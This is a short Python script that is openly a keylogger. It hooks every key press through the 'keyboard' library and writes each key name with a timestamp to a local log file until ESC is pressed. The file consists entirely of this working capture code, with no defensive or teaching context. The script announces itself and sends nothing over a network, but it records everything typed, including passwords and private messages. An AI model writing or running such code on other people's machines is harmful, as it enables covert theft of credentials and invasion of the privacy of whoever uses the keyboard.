import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.log"

def on_key_press(event):
    """Callback function to log key presses"""
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] Key pressed: {event.name}\n")

def main():
    """Main function to start the keylogger"""
    print("Keylogger started. Press 'ESC' to stop.")
    keyboard.on_press(on_key_press)

    # Keep running until ESC is pressed
    keyboard.wait('esc')

if __name__ == "__main__":
    main()

